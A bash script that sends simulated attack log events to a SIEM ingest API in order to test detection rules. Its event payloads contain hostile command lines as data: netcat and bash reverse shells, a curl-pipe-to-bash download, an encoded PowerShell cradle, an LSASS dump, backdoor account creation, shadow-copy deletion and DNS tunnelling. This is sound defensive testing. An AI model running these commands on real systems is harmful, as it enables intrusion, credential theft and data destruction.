#!/bin/bash
# simulate-attacks.sh — Send realistic attack event sequences to the CyberboxSIEM API
# Usage: ./simulate-attacks.sh <API_URL> [API_KEY] [HOST_HEADER]
# Example: ./simulate-attacks.sh http://cyberbox-api:8080
#          ./simulate-attacks.sh https://siem.cyberboxsecurity.com.br "919302f1..."
#          ./simulate-attacks.sh https://192.168.10.214:30443 "key" siem.cyberboxsecurity.com.br

set -e

API="${1:-http://cyberbox-api:8080}"
API_KEY="${2:-}"
HOST_HDR="${3:-}"
CONTENT_TYPE="Content-Type: application/json"

send_events() {
  local desc="$1"
  local payload="$2"
  local extra_headers=(-H "$CONTENT_TYPE")
  if [ -n "$HOST_HDR" ]; then
    extra_headers+=(-H "Host: $HOST_HDR")
  fi
  if [ -n "$API_KEY" ]; then
    extra_headers+=(-H "X-Api-Key: $API_KEY")
  else
    extra_headers+=(-H "x-tenant-id: safebox" -H "x-user-id: simulator" -H "x-roles: ingestor")
  fi
  HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "$API/api/v1/events:ingest" \
    "${extra_headers[@]}" -d "$payload")
  echo "  [$HTTP_CODE] $desc"
}

echo "=== CyberboxSIEM Attack Simulation ==="
echo "Target: $API"
echo ""

# ── 1. Brute-force SSH login attempts ────────────────────────────────────
# Sends 12 failed + 1 success to trigger the aggregate rule (count > 10 by SourceIp)
echo "[1/9] Brute-force SSH login attempts (12 failed + 1 success)..."
send_events "12 failed SSH logins from same IP" '{
  "events": [
    {"tenant_id":"safebox","source":"syslog","event_time":"2026-03-12T10:00:00Z","raw_payload":{"program":"sshd","message":"Failed password for root from 203.0.113.50 port 22 ssh2","SourceIp":"203.0.113.50","hostname":"web-prod-01"}},
    {"tenant_id":"safebox","source":"syslog","event_time":"2026-03-12T10:00:01Z","raw_payload":{"program":"sshd","message":"Failed password for root from 203.0.113.50 port 22 ssh2","SourceIp":"203.0.113.50","hostname":"web-prod-01"}},
    {"tenant_id":"safebox","source":"syslog","event_time":"2026-03-12T10:00:02Z","raw_payload":{"program":"sshd","message":"Failed password for root from 203.0.113.50 port 22 ssh2","SourceIp":"203.0.113.50","hostname":"web-prod-01"}},
    {"tenant_id":"safebox","source":"syslog","event_time":"2026-03-12T10:00:03Z","raw_payload":{"program":"sshd","message":"Failed password for root from 203.0.113.50 port 22 ssh2","SourceIp":"203.0.113.50","hostname":"web-prod-01"}},
    {"tenant_id":"safebox","source":"syslog","event_time":"2026-03-12T10:00:04Z","raw_payload":{"program":"sshd","message":"Failed password for admin from 203.0.113.50 port 22 ssh2","SourceIp":"203.0.113.50","hostname":"web-prod-01"}},
    {"tenant_id":"safebox","source":"syslog","event_time":"2026-03-12T10:00:05Z","raw_payload":{"program":"sshd","message":"Failed password for admin from 203.0.113.50 port 22 ssh2","SourceIp":"203.0.113.50","hostname":"web-prod-01"}},
    {"tenant_id":"safebox","source":"syslog","event_time":"2026-03-12T10:00:06Z","raw_payload":{"program":"sshd","message":"Failed password for ubuntu from 203.0.113.50 port 22 ssh2","SourceIp":"203.0.113.50","hostname":"web-prod-01"}},
    {"tenant_id":"safebox","source":"syslog","event_time":"2026-03-12T10:00:07Z","raw_payload":{"program":"sshd","message":"Failed password for ubuntu from 203.0.113.50 port 22 ssh2","SourceIp":"203.0.113.50","hostname":"web-prod-01"}},
    {"tenant_id":"safebox","source":"syslog","event_time":"2026-03-12T10:00:08Z","raw_payload":{"program":"sshd","message":"Failed password for deploy from 203.0.113.50 port 22 ssh2","SourceIp":"203.0.113.50","hostname":"web-prod-01"}},
    {"tenant_id":"safebox","source":"syslog","event_time":"2026-03-12T10:00:09Z","raw_payload":{"program":"sshd","message":"Failed password for deploy from 203.0.113.50 port 22 ssh2","SourceIp":"203.0.113.50","hostname":"web-prod-01"}},
    {"tenant_id":"safebox","source":"syslog","event_time":"2026-03-12T10:00:10Z","raw_payload":{"program":"sshd","message":"Failed password for test from 203.0.113.50 port 22 ssh2","SourceIp":"203.0.113.50","hostname":"web-prod-01"}},
    {"tenant_id":"safebox","source":"syslog","event_time":"2026-03-12T10:00:11Z","raw_payload":{"program":"sshd","message":"Failed password for test from 203.0.113.50 port 22 ssh2","SourceIp":"203.0.113.50","hostname":"web-prod-01"}},
    {"tenant_id":"safebox","source":"syslog","event_time":"2026-03-12T10:00:12Z","raw_payload":{"program":"sshd","message":"Accepted password for root from 203.0.113.50 port 22 ssh2","SourceIp":"203.0.113.50","hostname":"web-prod-01"}}
  ]
}'

# ── 2. Privilege escalation ──────────────────────────────────────────────
echo "[2/9] Privilege escalation — new admin account created..."
send_events "Net user /add + net localgroup administrators" '{
  "events": [
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:01:00Z","raw_payload":{"EventID":1,"Image":"C:\\\\Windows\\\\System32\\\\net.exe","CommandLine":"net user backdoor P@ssw0rd /add","ParentImage":"C:\\\\Windows\\\\System32\\\\cmd.exe","SubjectUserName":"administrator","hostname":"DC01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:01:01Z","raw_payload":{"EventID":4720,"TargetUserName":"backdoor","SubjectUserName":"administrator","hostname":"DC01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:01:02Z","raw_payload":{"EventID":1,"Image":"C:\\\\Windows\\\\System32\\\\net.exe","CommandLine":"net localgroup administrators backdoor /add","ParentImage":"C:\\\\Windows\\\\System32\\\\cmd.exe","SubjectUserName":"administrator","hostname":"DC01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:01:03Z","raw_payload":{"EventID":4732,"TargetUserName":"backdoor","MemberSid":"S-1-5-21-fake","SubjectUserName":"administrator","hostname":"DC01"}}
  ]
}'

# ── 3. Lateral movement — PsExec ─────────────────────────────────────────
echo "[3/9] Lateral movement — PsExec service installation..."
send_events "PsExec remote execution" '{
  "events": [
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:02:00Z","raw_payload":{"EventID":1,"Image":"C:\\\\Windows\\\\System32\\\\services.exe","CommandLine":"C:\\\\Windows\\\\PSEXESVC.exe","ParentImage":"C:\\\\Windows\\\\System32\\\\services.exe","User":"NT AUTHORITY\\\\SYSTEM","hostname":"WEB01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:02:01Z","raw_payload":{"EventID":7045,"ServiceName":"PSEXESVC","ServiceFileName":"C:\\\\Windows\\\\PSEXESVC.exe","ServiceType":"user mode service","hostname":"WEB01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:02:02Z","raw_payload":{"EventID":3,"Image":"C:\\\\Windows\\\\PSEXESVC.exe","DestinationIp":"192.168.1.50","DestinationPort":445,"hostname":"WEB01"}}
  ]
}'

# ── 4. Suspicious PowerShell — encoded command ───────────────────────────
echo "[4/9] Suspicious PowerShell — base64-encoded command..."
send_events "Encoded PowerShell download cradle" '{
  "events": [
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:03:00Z","raw_payload":{"EventID":1,"Image":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe","CommandLine":"powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1ADAALwBiAGEAZAAuAHAAcwAxACcAKQA=","ParentImage":"C:\\\\Windows\\\\System32\\\\cmd.exe","User":"CORP\\\\jsmith","hostname":"WS042"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:03:01Z","raw_payload":{"EventID":3,"Image":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe","DestinationIp":"192.168.1.50","DestinationPort":8080,"User":"CORP\\\\jsmith","hostname":"WS042"}}
  ]
}'

# ── 5. Mimikatz / credential dumping ─────────────────────────────────────
echo "[5/9] Credential dumping — Mimikatz-like LSASS access..."
send_events "LSASS memory access" '{
  "events": [
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:04:00Z","raw_payload":{"EventID":10,"SourceImage":"C:\\\\Users\\\\admin\\\\Documents\\\\procdump64.exe","TargetImage":"C:\\\\Windows\\\\System32\\\\lsass.exe","GrantedAccess":"0x1010","hostname":"DC01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:04:01Z","raw_payload":{"EventID":1,"Image":"C:\\\\Users\\\\admin\\\\Documents\\\\procdump64.exe","CommandLine":"procdump64.exe -ma lsass.exe lsass.dmp","User":"CORP\\\\admin","hostname":"DC01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:04:02Z","raw_payload":{"EventID":11,"Image":"C:\\\\Users\\\\admin\\\\Documents\\\\procdump64.exe","TargetFilename":"C:\\\\Users\\\\admin\\\\Documents\\\\lsass.dmp","hostname":"DC01"}}
  ]
}'

# ── 6. Ransomware indicators ─────────────────────────────────────────────
echo "[6/9] Ransomware indicators — shadow copy deletion + recovery disabled..."
send_events "Shadow copy deletion + vssadmin" '{
  "events": [
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:05:00Z","raw_payload":{"EventID":1,"Image":"C:\\\\Windows\\\\System32\\\\vssadmin.exe","CommandLine":"vssadmin delete shadows /all /quiet","ParentImage":"C:\\\\Windows\\\\System32\\\\cmd.exe","User":"NT AUTHORITY\\\\SYSTEM","hostname":"FS01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:05:01Z","raw_payload":{"EventID":1,"Image":"C:\\\\Windows\\\\System32\\\\wbadmin.exe","CommandLine":"wbadmin delete catalog -quiet","User":"NT AUTHORITY\\\\SYSTEM","hostname":"FS01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:05:02Z","raw_payload":{"EventID":1,"Image":"C:\\\\Windows\\\\System32\\\\bcdedit.exe","CommandLine":"bcdedit /set {default} recoveryenabled no","User":"NT AUTHORITY\\\\SYSTEM","hostname":"FS01"}}
  ]
}'

# ── 7. Data exfiltration — DNS tunneling ─────────────────────────────────
echo "[7/9] Data exfiltration — DNS tunneling pattern..."
send_events "Suspicious DNS queries to C2 domain" '{
  "events": [
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:06:00Z","raw_payload":{"EventID":22,"QueryName":"a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6.evil-c2.example.com","Image":"C:\\\\Windows\\\\System32\\\\svchost.exe","hostname":"WS042"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:06:01Z","raw_payload":{"EventID":22,"QueryName":"z9y8x7w6v5u4t3s2r1q0p9o8n7m6l5k4.evil-c2.example.com","Image":"C:\\\\Windows\\\\System32\\\\svchost.exe","hostname":"WS042"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:06:02Z","raw_payload":{"EventID":22,"QueryName":"exfiltrated-data-chunk-03-base64enc.evil-c2.example.com","Image":"C:\\\\Windows\\\\System32\\\\svchost.exe","hostname":"WS042"}}
  ]
}'

# ── 8. Linux reverse shell ───────────────────────────────────────────────
echo "[8/9] Linux — reverse shell execution..."
send_events "Netcat reverse shell + curl backdoor" '{
  "events": [
    {"tenant_id":"safebox","source":"linux_audit","event_time":"2026-03-12T10:07:00Z","raw_payload":{"program":"audit","CommandLine":"nc -e /bin/bash 203.0.113.50 4444","message":"type=EXECVE msg=audit(1710000000.000:100): argc=3 a0=/bin/bash a1=-c a2=nc -e /bin/bash 203.0.113.50 4444","hostname":"web-prod-01"}},
    {"tenant_id":"safebox","source":"linux_audit","event_time":"2026-03-12T10:07:01Z","raw_payload":{"program":"audit","CommandLine":"curl -s http://203.0.113.50/backdoor.sh | bash","message":"type=EXECVE msg=audit(1710000001.000:101): argc=4 a0=curl a1=-s a2=http://203.0.113.50/backdoor.sh a3=| bash","hostname":"web-prod-01"}},
    {"tenant_id":"safebox","source":"linux_audit","event_time":"2026-03-12T10:07:02Z","raw_payload":{"program":"audit","CommandLine":"bash -i >& /dev/tcp/203.0.113.50/8443 0>&1","message":"type=EXECVE bash reverse shell","hostname":"web-prod-01"}}
  ]
}'

# ── 9. Windows logon events (from Tor exit nodes) ────────────────────────
echo "[9/9] Windows logon — failed + success from Tor..."
send_events "Windows failed + successful logon events" '{
  "events": [
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:08:00Z","raw_payload":{"EventID":4625,"LogonType":3,"TargetUserName":"administrator","IpAddress":"185.220.101.1","WorkstationName":"ATTACKER-1","FailureReason":"Unknown user name or bad password","hostname":"DC01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:08:01Z","raw_payload":{"EventID":4625,"LogonType":3,"TargetUserName":"administrator","IpAddress":"185.220.101.2","WorkstationName":"ATTACKER-2","FailureReason":"Unknown user name or bad password","hostname":"DC01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:08:02Z","raw_payload":{"EventID":4625,"LogonType":3,"TargetUserName":"administrator","IpAddress":"185.220.101.3","WorkstationName":"ATTACKER-3","FailureReason":"Unknown user name or bad password","hostname":"DC01"}},
    {"tenant_id":"safebox","source":"windows_sysmon","event_time":"2026-03-12T10:08:03Z","raw_payload":{"EventID":4624,"LogonType":3,"TargetUserName":"administrator","IpAddress":"185.220.101.42","WorkstationName":"ATTACKER-21","hostname":"DC01"}}
  ]
}'

echo ""
echo "=== Simulation complete ==="
echo "Check the SIEM dashboard for alerts. Expected detections:"
echo "  - SSH brute force (12 failed logins from same IP)"
echo "  - Suspicious PowerShell (encoded command)"
echo "  - Mimikatz LSASS credential dump"
echo "  - DNS tunneling (C2 communication)"
echo "  - Linux reverse shell (nc/bash/curl)"
echo "  - PsExec lateral movement"
